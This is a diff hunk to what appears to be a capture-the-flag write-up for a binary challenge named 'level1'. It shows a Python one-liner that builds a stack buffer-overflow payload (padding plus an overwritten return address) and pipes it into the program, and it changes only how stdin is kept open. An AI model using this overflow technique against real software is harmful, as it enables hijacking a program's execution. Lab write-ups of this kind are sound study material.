@@ -11,7 +11,7 @@ objdump -dC -M intel level1
 
 ```shell
 python2.7 -c 'print("B"*76 + "\x44\x84\x04\x08")' > /tmp/exploit.txt
-cat /tmp/exploit.txt /dev/stdin | ./level1
+cat /tmp/exploit.txt - | ./level1
 ```
 
 ## flag
